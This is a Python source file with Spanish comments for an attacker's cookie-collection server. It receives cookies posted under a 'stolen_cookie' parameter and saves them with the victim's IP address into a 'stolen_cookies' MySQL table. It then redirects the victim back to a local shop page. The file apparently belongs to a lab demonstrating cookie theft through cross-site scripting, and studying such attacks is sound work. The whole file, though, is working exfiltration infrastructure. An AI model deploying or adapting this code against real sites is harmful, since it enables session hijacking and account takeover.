# Importar módulos necesarios
from http.server import BaseHTTPRequestHandler, HTTPServer  # Para crear un servidor HTTP básico
from urllib.parse import parse_qs  # Para analizar datos de formularios codificados en URL
import datetime  # Para manejar fechas y horas
import mysql.connector  # Para conectarse a MySQL
from dotenv import load_dotenv  # Para cargar variables de entorno desde .env
import os  # Para acceder a las variables de entorno

# Cargar variables de entorno desde .env.hacker
load_dotenv('.env.hacker')

# Configuración de la base de datos del hacker desde variables de entorno
DB_CONFIG = {
    'host': os.getenv('DB_HOST'),  # Nombre del servicio de la base de datos del hacker
    'user': os.getenv('DB_USER'),  # Usuario de la base de datos
    'password': os.getenv('DB_PASSWORD'),  # Contraseña
    'database': os.getenv('DB_NAME')  # Nombre de la base de datos del hacker
}

# Definir una clase personalizada para manejar las solicitudes HTTP
class MyHandler(BaseHTTPRequestHandler):
    # Método para manejar solicitudes POST
    def do_POST(self):
        # Obtener la longitud del contenido de la solicitud
        content_length = int(self.headers['Content-Length'])
        # Leer los datos enviados en la solicitud POST
        post_data = self.rfile.read(content_length).decode('utf-8')
        # Analizar los datos POST para extraer parámetros
        params = parse_qs(post_data)
        # Obtener las cookies robadas (si existen)
        cookies = params.get('stolen_cookie', ['No cookies'])[0]
        
        # Guardar las cookies robadas en la base de datos del hacker
        self.save_to_database(self.client_address[0], cookies)
        
        # Redirigir al cliente a otra ubicación SIN crear un bucle
        self.send_response(302)  # Código de estado HTTP 302 (Redirección)
        self.send_header('Location', 'http://localhost:8080/templates/product/product_list.php')  # URL de redirección
        self.end_headers()  # Finalizar las cabeceras de la respuesta

    # Método para guardar las cookies en la base de datos del hacker
    def save_to_database(self, ip_address, cookie_data):
        try:
            # Dividir la cookie en nombre y valor
            if '=' in cookie_data:
                cookie_name, cookie_value = cookie_data.split('=', 1)  # Dividir en la primera ocurrencia de '='
            else:
                cookie_name, cookie_value = cookie_data, ''  # Si no hay '=', guardar todo en el nombre

            # Conectar a la base de datos del hacker
            connection = mysql.connector.connect(**DB_CONFIG)
            cursor = connection.cursor()
            
            # Insertar los datos en la tabla stolen_cookies
            query = """
                INSERT INTO stolen_cookies (ip_address, cookie_name, cookie_value, timestamp)
                VALUES (%s, %s, %s, %s)
            """
            timestamp = datetime.datetime.now()
            cursor.execute(query, (ip_address, cookie_name, cookie_value, timestamp))
            
            # Confirmar la transacción
            connection.commit()
            
            # Cerrar la conexión
            cursor.close()
            connection.close()
            
            print(f"Cookie guardada en la base de datos del hacker: {cookie_name}={cookie_value}")
        except mysql.connector.Error as err:
            print(f"Error al guardar en la base de datos del hacker: {err}")

    # Método para manejar solicitudes GET
    def do_GET(self):
        self.send_response(200)  # Código de estado HTTP 200 (OK)
        self.end_headers()  # Finalizar las cabeceras de la respuesta
        self.wfile.write(b"Servidor activo")  # Enviar un mensaje de respuesta al cliente

# Punto de entrada del script
if __name__ == "__main__":
    # Crear un servidor HTTP que escuche en todas las interfaces (0.0.0.0) en el puerto 8082
    server = HTTPServer(('0.0.0.0', 8082), MyHandler)
    print("Servidor escuchando en puerto 8082...")
    # Mantener el servidor en ejecución indefinidamente
    server.serve_forever()